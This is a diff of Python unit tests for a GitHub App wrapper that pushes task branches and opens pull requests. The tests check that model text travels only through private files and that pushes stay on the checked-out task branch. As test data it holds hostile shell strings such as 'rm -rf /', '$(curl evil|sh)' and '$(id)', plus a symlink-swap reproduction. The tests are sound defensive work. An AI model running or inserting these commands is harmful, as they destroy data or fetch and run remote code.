@@ -9,6 +9,8 @@ import io
 import json
 import os
 import pathlib
+import subprocess
+import sys
 import tempfile
 import unittest
 from unittest import mock
@@ -87,6 +89,10 @@ class WrapperTests(unittest.TestCase):
                 return mock.Mock(
                     returncode=0, stdout="/srv/homelab\n", stderr=""
                 )
+            if command[3:4] == ["symbolic-ref"]:
+                return mock.Mock(
+                    returncode=0, stdout="wt/t_7\n", stderr=""
+                )
             if command[:3] == ["git", "config", "--file"]:
                 pathlib.Path(command[3]).write_text(
                     "[safe]\n\tdirectory = /srv/homelab\n",
@@ -99,7 +105,7 @@ class WrapperTests(unittest.TestCase):
             return completed
 
         args = argparse.Namespace(
-            repo="jimmybish/homelab", branch="task/7", source="HEAD"
+            repo="jimmybish/homelab", branch="wt/t_7", source="HEAD"
         )
         with mock.patch.object(
             self.wrapper, "installation_token", return_value="installation-secret"
@@ -111,7 +117,7 @@ class WrapperTests(unittest.TestCase):
         environment = run.call_args_list[-1].kwargs["env"]
         self.assertEqual(command[2], "--porcelain")
         self.assertEqual(command[3], "https://github.com/jimmybish/homelab.git")
-        self.assertEqual(command[4], "HEAD:refs/heads/task/7")
+        self.assertEqual(command[4], "HEAD:refs/heads/wt/t_7")
         self.assertNotIn("installation-secret", " ".join(command))
         self.assertNotIn("installation-secret", json.dumps(environment))
         self.assertIn("directory = /srv/homelab", captured_config[0])
@@ -130,8 +136,8 @@ class WrapperTests(unittest.TestCase):
             repo="jimmybish/homelab",
             head="task/9",
             base="main",
-            title="Task 9",
-            body="Summary",
+            title_file=self.write_text("title.txt", "Task 9"),
+            body_file=self.write_text("body.md", "Summary"),
             draft=False,
         )
         with mock.patch.object(
@@ -162,7 +168,8 @@ class WrapperTests(unittest.TestCase):
                 result = self.wrapper.main([
                     "--config", self.write_config(),
                     "open-pr", "--repo", "someone/else", "--head", "task",
-                    "--title", "title", "--body", "body",
+                    "--title-file", self.write_text("title.txt", "title"),
+                    "--body-file", self.write_text("body.txt", "body"),
                 ])
         self.assertEqual(result, 1)
         mint.assert_not_called()
@@ -182,7 +189,8 @@ class WrapperTests(unittest.TestCase):
                     result = self.wrapper.main([
                         "--config", self.write_config(),
                         "comment", "--repo", "jimmybish/homelab",
-                        "--pr", "7", "--body", "hello",
+                        "--pr", "7",
+                        "--body-file", self.write_text("comment.txt", "hello"),
                     ])
         self.assertEqual(result, 1)
         self.assertIn("not a pull request", stderr.getvalue())
@@ -197,7 +205,10 @@ class WrapperTests(unittest.TestCase):
                 return {"pull_request": {"url": "example"}}
             return {"html_url": "https://github.com/jimmybish/homelab/pull/7"}
 
-        args = argparse.Namespace(repo="jimmybish/homelab", pr=7, body="done")
+        args = argparse.Namespace(
+            repo="jimmybish/homelab", pr=7,
+            body_file=self.write_text("comment.txt", "done"),
+        )
         with mock.patch.object(
             self.wrapper, "installation_token", return_value="secret"
         ), mock.patch.object(
@@ -218,6 +229,616 @@ class WrapperTests(unittest.TestCase):
         config_path.chmod(0o644)
         with self.assertRaisesRegex(self.wrapper.AppError, "configuration file"):
             self.wrapper.load_config(config_path)
+
+    def test_model_text_file_keeps_shell_metacharacters_as_data(self):
+        hostile = (
+            "'; rm -rf / # $(whoami) `id` \"quote' \\ backslash\n"
+            "line two with $VAR and ${OTHER}"
+        )
+        path = self.write_text("hostile.md", hostile)
+        text = self.wrapper.read_model_text(path, "body")
+        self.assertEqual(text, hostile)
+        self.assertIn("rm -rf", text)
+        self.assertIn("$(whoami)", text)
+
+    def test_model_text_supports_stdin_and_strips_trailing_newlines(self):
+        payload = "line one\nline two\n\n"
+        with mock.patch.object(
+            self.wrapper.sys, "stdin", io.StringIO(payload)
+        ):
+            text = self.wrapper.read_model_text("-", "title")
+        self.assertEqual(text, "line one\nline two")
+
+    def test_model_text_rejects_empty_oversize_and_missing(self):
+        empty = self.write_text("empty.txt", "   \n")
+        with self.assertRaisesRegex(self.wrapper.AppError, "must not be empty"):
+            self.wrapper.read_model_text(empty, "body")
+        big = self.write_text("big.txt", "x" * (self.wrapper.MODEL_TEXT_LIMIT + 1))
+        with self.assertRaisesRegex(self.wrapper.AppError, "exceeds"):
+            self.wrapper.read_model_text(big, "body")
+        missing = str(pathlib.Path(self.tempdir.name) / "nope.txt")
+        with self.assertRaisesRegex(
+            self.wrapper.AppError, "inline text on the command line is not accepted"
+        ):
+            self.wrapper.read_model_text(missing, "title")
+        inline = "$(curl evil|sh)"
+        with self.assertRaisesRegex(
+            self.wrapper.AppError, "inline text on the command line is not accepted"
+        ):
+            self.wrapper.read_model_text(inline, "title")
+
+    def test_model_text_requires_private_owned_file(self):
+        for mode in (0o644, 0o640, 0o606, 0o666, 0o755):
+            shared = self.write_text(f"shared-{mode:o}.txt", "text")
+            os.chmod(shared, mode)
+            with self.subTest(mode=mode):
+                with self.assertRaisesRegex(
+                    self.wrapper.AppError, "no group or other access"
+                ):
+                    self.wrapper.read_model_text(shared, "body")
+        private = self.write_text("private.txt", "accepted text")
+        os.chmod(private, 0o600)
+        self.assertEqual(
+            self.wrapper.read_model_text(private, "body"), "accepted text"
+        )
+
+    def test_model_text_rejects_files_not_owned_by_executing_user(self):
+        owned = self.write_text("mine.txt", "text")
+        with mock.patch.object(self.wrapper.os, "getuid", return_value=os.getuid() + 1):
+            with self.assertRaisesRegex(
+                self.wrapper.AppError, "owned by the executing user"
+            ):
+                self.wrapper.read_model_text(owned, "body")
+        with mock.patch.object(self.wrapper.os, "getuid", return_value=os.getuid()):
+            self.assertEqual(self.wrapper.read_model_text(owned, "body"), "text")
+
+    def test_model_text_rejects_symlinks(self):
+        target = self.write_text("target.txt", "text")
+        link = pathlib.Path(self.tempdir.name) / "link.txt"
+        link.symlink_to(target)
+        with self.assertRaisesRegex(self.wrapper.AppError, "regular text file"):
+            self.wrapper.read_model_text(str(link), "body")
+
+    def test_model_text_rejects_path_swapped_to_symlink_at_open(self):
+        # Deterministic TOCTOU reproduction: the pathname is validated as a
+        # private regular file, then swapped for a symlink to a secret file
+        # at the exact moment of the open. Validation must stay bound to the
+        # opened descriptor so target content is never returned.
+        secret = self.write_text("secret.txt", "TARGET_CONTENT")
+        candidate = self.write_text("candidate.txt", "safe text")
+        real_open = os.open
+
+        def swapping_open(path, flags, *args, **kwargs):
+            if pathlib.Path(path).name == "candidate.txt":
+                os.unlink(candidate)
+                os.symlink(secret, candidate)
+            return real_open(path, flags, *args, **kwargs)
+
+        with mock.patch.object(self.wrapper.os, "open", side_effect=swapping_open):
+            with self.assertRaises(self.wrapper.AppError) as caught:
+                self.wrapper.read_model_text(str(candidate), "body")
+        self.assertNotIn("TARGET_CONTENT", str(caught.exception))
+        self.assertTrue(pathlib.Path(candidate).is_symlink())
+
+    def test_model_text_rejects_special_files(self):
+        directory = pathlib.Path(self.tempdir.name) / "adir"
+        directory.mkdir()
+        with self.assertRaisesRegex(self.wrapper.AppError, "regular text file"):
+            self.wrapper.read_model_text(str(directory), "body")
+
+    def test_model_text_rejects_fifo_without_blocking(self):
+        # A writer-less FIFO opened without O_NONBLOCK hangs forever in
+        # os.open() before fstat can reject it. Run under a hard timeout so
+        # a regression fails fast instead of hanging the suite, and prove
+        # the subprocess raises AppError (exit 0) rather than timing out.
+        fifo = pathlib.Path(self.tempdir.name) / "private.fifo"
+        os.mkfifo(fifo)
+        os.chmod(fifo, 0o600)
+        script = (
+            "import importlib.util, sys\n"
+            "spec = importlib.util.spec_from_file_location('github_app', sys.argv[1])\n"
+            "mod = importlib.util.module_from_spec(spec)\n"
+            "spec.loader.exec_module(mod)\n"
+            "try:\n"
+            "    mod.read_model_text(sys.argv[2], 'body')\n"
+            "except mod.AppError:\n"
+            "    sys.exit(0)\n"
+            "except Exception:\n"
+            "    sys.exit(2)\n"
+            "sys.exit(3)\n"
+        )
+        try:
+            completed = subprocess.run(
+                [sys.executable, "-c", script, str(MODULE_PATH), str(fifo)],
+                capture_output=True,
+                timeout=10,
+            )
+        except subprocess.TimeoutExpired:
+            self.fail("read_model_text blocked on a writer-less FIFO")
+        self.assertEqual(completed.returncode, 0, completed.stderr.decode())
+
+    def test_model_text_rejects_fifo_with_writer_via_fstat(self):
+        # With a writer attached the non-blocking open succeeds, so the
+        # rejection must come from the fstat regular-file check bound to
+        # the opened descriptor.
+        fifo = pathlib.Path(self.tempdir.name) / "held.fifo"
+        os.mkfifo(fifo)
+        os.chmod(fifo, 0o600)
+        writer = os.open(fifo, os.O_RDWR)
+        try:
+            with self.assertRaisesRegex(
+                self.wrapper.AppError, "regular text file"
+            ):
+                self.wrapper.read_model_text(str(fifo), "body")
+        finally:
+            os.close(writer)
+
+    def test_model_text_reads_stdin_bounded_by_the_limit(self):
+        class RecordingStdin(io.StringIO):
+            requested = None
+
+            def read(self, size=-1):
+                RecordingStdin.requested = size
+                return super().read(size)
+
+        with mock.patch.object(
+            self.wrapper.sys, "stdin", RecordingStdin("accepted text")
+        ):
+            text = self.wrapper.read_model_text("-", "title")
+        self.assertEqual(text, "accepted text")
+        self.assertEqual(
+            RecordingStdin.requested, self.wrapper.MODEL_TEXT_LIMIT + 1
+        )
+
+    def test_model_text_rejects_oversized_stdin(self):
+        payload = "x" * (self.wrapper.MODEL_TEXT_LIMIT + 1)
+        with mock.patch.object(self.wrapper.sys, "stdin", io.StringIO(payload)):
+            with self.assertRaisesRegex(
+                self.wrapper.AppError, f"exceeds {self.wrapper.MODEL_TEXT_LIMIT}"
+            ):
+                self.wrapper.read_model_text("-", "body")
+
+    def test_model_text_stdin_read_errors_become_app_errors(self):
+        class ExplodingStdin:
+            def __init__(self, error):
+                self.error = error
+
+            def read(self, size=-1):
+                raise self.error
+
+        for error in (
+            OSError(11, "would block"),
+            OSError(9, "bad file descriptor"),
+            ValueError("I/O operation on closed file"),
+            UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte"),
+        ):
+            with mock.patch.object(
+                self.wrapper.sys, "stdin", ExplodingStdin(error)
+            ):
+                with self.assertRaisesRegex(
+                    self.wrapper.AppError, "cannot read text from stdin"
+                ):
+                    self.wrapper.read_model_text("-", "title")
+
+    def test_model_text_none_stdin_is_a_clean_app_error(self):
+        with mock.patch.object(self.wrapper.sys, "stdin", None):
+            with self.assertRaisesRegex(
+                self.wrapper.AppError, "cannot read text from stdin"
+            ):
+                self.wrapper.read_model_text("-", "title")
+
+    def test_main_rejects_invalid_utf8_stdin_without_traceback_or_echo(self):
+        # End-to-end through main(): invalid UTF-8 on stdin must exit via the
+        # AppError path (rc 1, one 'error:' line) and must never print a
+        # traceback or echo any of the rejected private bytes.
+        sentinel = "PRIVATESENTINELtext"
+        payload = sentinel.encode() + b"\xff\xfe\x80 not-utf8"
+        completed = subprocess.run(
+            [
+                sys.executable, str(MODULE_PATH), "--config", self.write_config(),
+                "open-pr", "--repo", "jimmybish/homelab", "--head", "wt/t_1",
+                "--title-file", "-", "--body-file", self.write_text("body.md", "b"),
+            ],
+            input=payload,
+            capture_output=True,
+            timeout=30,
+        )
+        self.assertEqual(completed.returncode, 1, completed.stderr.decode(errors="replace"))
+        stderr = completed.stderr.decode(errors="replace")
+        self.assertNotIn("Traceback", stderr)
+        self.assertNotIn(sentinel, stderr)
+        self.assertNotIn(sentinel, completed.stdout.decode(errors="replace"))
+        self.assertEqual(stderr, "error: cannot read text from stdin\n")
+
+    def test_main_closed_stdin_is_a_clean_error_exit(self):
+        # fd 0 closed before main runs: the read raises EBADF and must
+        # surface as the generic AppError exit, not a traceback.
+        script = (
+            "import importlib.util, os, sys\n"
+            "spec = importlib.util.spec_from_file_location('github_app', sys.argv[1])\n"
+            "mod = importlib.util.module_from_spec(spec)\n"
+            "spec.loader.exec_module(mod)\n"
+            "os.close(0)\n"
+            "sys.exit(mod.main(['--config', sys.argv[2], 'open-pr', '--repo',"
+            " 'jimmybish/homelab', '--head', 'wt/t_1', '--title-file', '-',"
+            " '--body-file', sys.argv[3]]))\n"
+        )
+        completed = subprocess.run(
+            [sys.executable, "-c", script, str(MODULE_PATH), self.write_config(),
+             self.write_text("body.md", "b")],
+            capture_output=True,
+            timeout=30,
+        )
+        self.assertEqual(completed.returncode, 1, completed.stderr.decode(errors="replace"))
+        stderr = completed.stderr.decode(errors="replace")
+        self.assertNotIn("Traceback", stderr)
+        self.assertEqual(stderr, "error: cannot read text from stdin\n")
+
+    def test_push_destination_rejects_non_task_branches_before_token_mint(self):
+        # The destination must match wt/<task-id>; anything else (protected
+        # branches, feature branches, raw refs, traversal attempts) fails
+        # before an installation token is minted or any network call runs.
+        for rejected in (
+            "main", "master", "feature/x", "refs/heads/main",
+            "wt/", "wt/../x", "wt//x", "w/t_1", "wtx/t_1",
+            "WT/t_1", "wt/t_1/", ".wt/t_1",
+        ):
+            with self.subTest(branch=rejected):
+                with mock.patch.object(self.wrapper, "installation_token") as mint:
+                    stderr = io.StringIO()
+                    with contextlib.redirect_stderr(stderr):
+                        result = self.wrapper.main([
+                            "--config", self.write_config(),
+                            "push-branch", "--repo", "jimmybish/homelab",
+                            "--branch", rejected,
+                        ])
+                    self.assertEqual(result, 1)
+                    mint.assert_not_called()
+                    self.assertIn("wt/<task-id>", stderr.getvalue())
+        # Traversal ids are rejected too (by the ref-safety check that runs
+        # alongside the convention check); assert only that they are denied.
+        for traversal in ("wt/t_..x", "wt/t_1\\"):
+            with self.subTest(branch=traversal):
+                with mock.patch.object(self.wrapper, "installation_token") as mint:
+                    with contextlib.redirect_stderr(io.StringIO()):
+                        result = self.wrapper.main([
+                            "--config", self.write_config(),
+                            "push-branch", "--repo", "jimmybish/homelab",
+                            "--branch", traversal,
+                        ])
+                    self.assertEqual(result, 1)
+                    mint.assert_not_called()
+
+    def test_push_accepts_checked_out_task_branch(self):
+        self.assertTrue(self.wrapper.TASK_BRANCH_RE.fullmatch("wt/t_abc123"))
+        self.assertTrue(self.wrapper.TASK_BRANCH_RE.fullmatch("wt/t_93bab1bd"))
+        commands = []
+
+        def fake_run(command, *_args, **_kwargs):
+            commands.append(list(command))
+            if command[:3] == ["git", "config", "--file"]:
+                pathlib.Path(command[3]).write_text(
+                    "[safe]\n\tdirectory = /srv/homelab\n", encoding="utf-8",
+                )
+            if command[3:4] == ["symbolic-ref"]:
+                return mock.Mock(
+                    returncode=0, stdout="wt/t_abc123\n", stderr=""
+                )
+            return mock.Mock(returncode=0, stdout="/srv/homelab\n", stderr="")
+
+        # The destination equals the branch actually checked out in this
+        # worktree (Git reports it via symbolic-ref), so both gates pass.
+        with mock.patch.object(
+            self.wrapper, "validate_task_branch",
+            wraps=self.wrapper.validate_task_branch,
+        ) as check, mock.patch.object(
+            self.wrapper, "installation_token", return_value="secret"
+        ), mock.patch.object(
+            self.wrapper.subprocess, "run", side_effect=fake_run
+        ):
+            result = self.wrapper.push_branch(self.config, argparse.Namespace(
+                repo="jimmybish/homelab", branch="wt/t_abc123", source="HEAD",
+            ))
+        check.assert_called_once_with("wt/t_abc123")
+        self.assertIn(
+            ["git", "-C", "/srv/homelab", "symbolic-ref", "--short", "HEAD"],
+            commands,
+        )
+        self.assertEqual(commands[-1][:2], ["git", "push"])
+        self.assertEqual(result["branch"], "wt/t_abc123")
+
+    def test_push_rejects_other_task_branch_before_token_mint(self):
+        # Gate 2 regression: a syntactically valid wt/<task-id> that is NOT
+        # the checked-out branch is refused after the shape check, using
+        # Git's own answer for what is checked out, before the installation
+        # token is minted and before any git push runs.
+        commands = []
+
+        def fake_run(command, *_args, **_kwargs):
+            commands.append(list(command))
+            if command[:3] == ["git", "rev-parse", "--show-toplevel"]:
+                return mock.Mock(
+                    returncode=0, stdout="/srv/homelab\n", stderr=""
+                )
+            if command[3:4] == ["symbolic-ref"]:
+                # This worktree is on wt/t_abc123; the caller asks for
+                # another task's branch.
+                return mock.Mock(
+                    returncode=0, stdout="wt/t_abc123\n", stderr=""
+                )
+            return mock.Mock(returncode=0, stdout="", stderr="")
+
+        with mock.patch.object(
+            self.wrapper, "installation_token"
+        ) as mint, mock.patch.object(
+            self.wrapper.subprocess, "run", side_effect=fake_run
+        ):
+            stderr = io.StringIO()
+            with contextlib.redirect_stderr(stderr):
+                result = self.wrapper.main([
+                    "--config", self.write_config(),
+                    "push-branch", "--repo", "jimmybish/homelab",
+                    "--branch", "wt/t_other_task",
+                ])
+        self.assertEqual(result, 1)
+        self.assertIn("checked out", stderr.getvalue())
+        self.assertNotIn("wt/t_other_task", stderr.getvalue())
+        mint.assert_not_called()
+        self.assertTrue(any(c[3:4] == ["symbolic-ref"] for c in commands))
+        self.assertFalse(any(c[:2] == ["git", "push"] for c in commands))
+
+    def test_push_rejects_detached_head_before_token_mint(self):
+        # With no single checked-out branch (symbolic-ref fails) the
+        # binding gate cannot be satisfied, so nothing is pushed.
+        def fake_run(command, *_args, **_kwargs):
+            if command[:3] == ["git", "rev-parse", "--show-toplevel"]:
+                return mock.Mock(
+                    returncode=0, stdout="/srv/homelab\n", stderr=""
+                )
+            if command[3:4] == ["symbolic-ref"]:
+                return mock.Mock(returncode=1, stdout="", stderr="")
+            return mock.Mock(returncode=0, stdout="", stderr="")
+
+        with mock.patch.object(
+            self.wrapper, "installation_token"
+        ) as mint, mock.patch.object(
+            self.wrapper.subprocess, "run", side_effect=fake_run
+        ):
+            stderr = io.StringIO()
+            with contextlib.redirect_stderr(stderr):
+                result = self.wrapper.main([
+                    "--config", self.write_config(),
+                    "push-branch", "--repo", "jimmybish/homelab",
+                    "--branch", "wt/t_abc123",
+                ])
+        self.assertEqual(result, 1)
+        self.assertIn("no single checked-out branch", stderr.getvalue())
+        mint.assert_not_called()
+
+    def push_source_fixture(self, checked_out):
+        """subprocess.run fake: worktree on `checked_out`, records commands."""
+        commands = []
+
+        def fake_run(command, *_args, **_kwargs):
+            commands.append(list(command))
+            if command[:3] == ["git", "rev-parse", "--show-toplevel"]:
+                return mock.Mock(
+                    returncode=0, stdout="/srv/homelab\n", stderr=""
+                )
+            if command[3:4] == ["symbolic-ref"]:
+                return mock.Mock(
+                    returncode=0, stdout=f"{checked_out}\n", stderr=""
+                )
+            if command[:3] == ["git", "config", "--file"]:
+                pathlib.Path(command[3]).write_text(
+                    "[safe]\n\tdirectory = /srv/homelab\n", encoding="utf-8",
+                )
+            return mock.Mock(returncode=0, stdout="", stderr="")
+
+        return commands, fake_run
+
+    def test_push_rejects_other_task_source_before_token_mint(self):
+        # Gate 3 regression: from the CORRECT worktree (destination passes
+        # gate 2), an explicit --source pointing at another task's branch
+        # would publish that task's unreviewed commits via the refspec.
+        # It is refused with the Git-reported checked-out branch as the
+        # only source of truth, before the installation token is minted
+        # and before any git push runs.
+        commands, fake_run = self.push_source_fixture("wt/t_abc123")
+        with mock.patch.object(
+            self.wrapper, "installation_token"
+        ) as mint, mock.patch.object(
+            self.wrapper.subprocess, "run", side_effect=fake_run
+        ):
+            stderr = io.StringIO()
+            with contextlib.redirect_stderr(stderr):
+                result = self.wrapper.main([
+                    "--config", self.write_config(),
+                    "push-branch", "--repo", "jimmybish/homelab",
+                    "--branch", "wt/t_abc123",
+                    "--source", "wt/t_other_task",
+                ])
+        self.assertEqual(result, 1)
+        self.assertIn("push source must be HEAD", stderr.getvalue())
+        self.assertNotIn("wt/t_other_task", stderr.getvalue())
+        mint.assert_not_called()
+        self.assertTrue(any(c[3:4] == ["symbolic-ref"] for c in commands))
+        self.assertFalse(any(c[:2] == ["git", "push"] for c in commands))
+
+    def test_push_rejects_non_branch_source_before_token_mint(self):
+        # Commit shas, tags, and any other ref are equally refused as a
+        # source even when the destination gate is satisfied.
+        for hostile_source in ("b0123456789abcdef0123456789abcdef0123456",
+                               "v1.2.3", "origin/wt/t_abc123"):
+            commands, fake_run = self.push_source_fixture("wt/t_abc123")
+            with mock.patch.object(
+                self.wrapper, "installation_token"
+            ) as mint, mock.patch.object(
+                self.wrapper.subprocess, "run", side_effect=fake_run
+            ):
+                with contextlib.redirect_stderr(io.StringIO()):
+                    result = self.wrapper.main([
+                        "--config", self.write_config(),
+                        "push-branch", "--repo", "jimmybish/homelab",
+                        "--branch", "wt/t_abc123",
+                        "--source", hostile_source,
+                    ])
+            self.assertEqual(result, 1)
+            mint.assert_not_called()
+            self.assertFalse(any(c[:2] == ["git", "push"] for c in commands))
+
+    def test_push_accepts_head_and_checked_out_source(self):
+        # Both sanctioned sources push: the HEAD default, and an explicit
+        # source equal byte-for-byte to the Git-reported checked-out
+        # branch. The refspec always keeps the bound destination.
+        for source in ("HEAD", "wt/t_abc123"):
+            _commands, fake_run = self.push_source_fixture("wt/t_abc123")
+            with mock.patch.object(
+                self.wrapper, "installation_token", return_value="secret"
+            ), mock.patch.object(
+                self.wrapper.subprocess, "run", side_effect=fake_run
+            ) as run:
+                result = self.wrapper.push_branch(self.config, argparse.Namespace(
+                    repo="jimmybish/homelab", branch="wt/t_abc123", source=source,
+                ))
+            command = run.call_args_list[-1].args[0]
+            self.assertEqual(command[:2], ["git", "push"])
+            self.assertEqual(
+                command[-1], f"{source}:refs/heads/wt/t_abc123"
+            )
+            self.assertEqual(result["branch"], "wt/t_abc123")
+
+    def test_task_branch_validation_precedes_repository_lookup(self):
+        # Rejection happens before even the local `git rev-parse` lookup,
+        # so a hostile destination never reaches any git or network step.
+        with mock.patch.object(self.wrapper.subprocess, "run") as run, \
+                mock.patch.object(self.wrapper, "installation_token") as mint:
+            with contextlib.redirect_stderr(io.StringIO()):
+                result = self.wrapper.main([
+                    "--config", self.write_config(),
+                    "push-branch", "--repo", "jimmybish/homelab",
+                    "--branch", "main",
+                ])
+        self.assertEqual(result, 1)
+        run.assert_not_called()
+        mint.assert_not_called()
+
+    def test_open_pr_and_comment_reject_inline_text_and_hide_it_from_argv(self):
+        hostile = "PR $(id) `whoami` body with \"quotes\" and 'apostrophes'"
+        for argv in (
+            ["--config", self.write_config(), "open-pr", "--repo",
+             "jimmybish/homelab", "--head", "task/9",
+             "--title", hostile, "--body", hostile],
+            ["--config", self.write_config(), "comment", "--repo",
+             "jimmybish/homelab", "--pr", "7", "--body", hostile],
+        ):
+            stderr = io.StringIO()
+            with contextlib.redirect_stderr(stderr):
+                with self.assertRaises(SystemExit):  # argparse: unknown option
+                    self.wrapper.main(argv)
+            self.assertIn("title-file" if "open-pr" in argv else "body-file",
+                          stderr.getvalue())
+            self.assertNotIn(hostile, stderr.getvalue())
+
+    def test_usage_errors_never_echo_user_supplied_text(self):
+        # Hostile inline --title/--body alongside OTHERWISE-VALID file args:
+        # argparse reaches the unrecognized-arguments stage and used to echo
+        # the rejected values verbatim in its error tail.
+        hostile = "SECRET-DRAFT-$(id)-`whoami`-payload"
+        title_file = self.write_text("t.txt", "Safe title")
+        body_file = self.write_text("b.txt", "Safe body")
+        cases = [
+            ["--config", self.write_config(), "open-pr", "--repo",
+             "jimmybish/homelab", "--head", "wt/t_1",
+             "--title-file", title_file, "--body-file", body_file,
+             "--title", hostile, "--body", hostile],
+            ["--config", self.write_config(), "comment", "--repo",
+             "jimmybish/homelab", "--pr", "7",
+             "--body-file", body_file, "--body", hostile],
+        ]
+        for argv in cases:
+            stdout, stderr = io.StringIO(), io.StringIO()
+            with contextlib.redirect_stdout(stdout), \
+                    contextlib.redirect_stderr(stderr):
+                with self.assertRaises(SystemExit) as caught:
+                    self.wrapper.main(argv)
+            output = stdout.getvalue() + stderr.getvalue()
+            self.assertEqual(caught.exception.code, 2)
+            self.assertNotIn(hostile, output)
+            self.assertIn("usage:", stderr.getvalue())
+            self.assertEqual(output.count("invalid command line"), 1)
+
+    def test_malformed_option_values_are_not_echoed(self):
+        # Type-conversion failures (e.g. non-integer --pr) must also stay
+        # generic instead of echoing the rejected value.
+        argv = ["--config", self.write_config(), "comment", "--repo",
+                "jimmybish/homelab", "--pr", "$(id)", "--body-file", "b"]
+        stdout, stderr = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(stdout), \
+                contextlib.redirect_stderr(stderr):
+            with self.assertRaises(SystemExit) as caught:
+                self.wrapper.main(argv)
+        self.assertEqual(caught.exception.code, 2)
+        self.assertNotIn("$(id)", stdout.getvalue() + stderr.getvalue())
+
+    def test_parser_subcommands_all_use_sanitized_parser(self):
+        root = self.wrapper.parser()
+        self.assertIsInstance(root, self.wrapper.SanitizedArgumentParser)
+        subparsers = [
+            action for action in root._actions
+            if isinstance(action, argparse._SubParsersAction)
+        ]
+        self.assertEqual(len(subparsers), 1)
+        for name, sub in subparsers[0].choices.items():
+            self.assertIsInstance(
+                sub, self.wrapper.SanitizedArgumentParser, msg=name)
+
+    def test_open_pr_text_never_reaches_child_process_argv(self):
+        hostile = "Body $('`\"\\ injection') payload"
+        title_file = self.write_text("title.txt", "Task title " + hostile)
+        body_file = self.write_text("body.txt", hostile)
+        args = argparse.Namespace(
+            repo="jimmybish/homelab", head="task/9", base="main",
+            title_file=title_file, body_file=body_file, draft=False,
+        )
+        with mock.patch.object(
+            self.wrapper, "installation_token", return_value="secret"
+        ), mock.patch.object(
+            self.wrapper, "api_request",
+            return_value={"number": 1, "html_url": "url"},
+        ) as api, mock.patch.object(
+            self.wrapper.subprocess, "run"
+        ) as run:
+            self.wrapper.open_pr(self.config, args)
+        run.assert_not_called()
+        payload = api.call_args.args[4]
+        self.assertEqual(payload["body"], hostile)
+        self.assertIn(hostile, payload["title"])
+
+    def test_parser_requires_file_transport_for_all_model_text(self):
+        text = "Model prose `with $(metachars)` and \"quotes\"\nsecond line"
+        title_file = self.write_text("t.txt", "Title " + text)
+        body_file = self.write_text("b.txt", text)
+        args = self.wrapper.parser().parse_args([
+            "--config", "cfg", "open-pr", "--repo", "jimmybish/homelab",
+            "--head", "wt/t_1", "--title-file", title_file,
+            "--body-file", body_file,
+        ])
+        self.assertEqual(args.title_file, title_file)
+        self.assertEqual(args.body_file, body_file)
+        self.assertFalse(any(text in value for value in
+                             [args.repo, args.head, args.base,
+                              args.title_file, args.body_file]))
+        self.wrapper.parser().parse_args([
+            "--config", "cfg", "comment", "--repo", "jimmybish/homelab",
+            "--pr", "3", "--body-file", body_file,
+        ])
+
+    def write_text(self, name, content):
+        path = pathlib.Path(self.tempdir.name) / name
+        path.write_text(content, encoding="utf-8")
+        path.chmod(0o600)
+        return str(path)
 
     def write_config(self):
         path = pathlib.Path(self.tempdir.name) / "config.json"
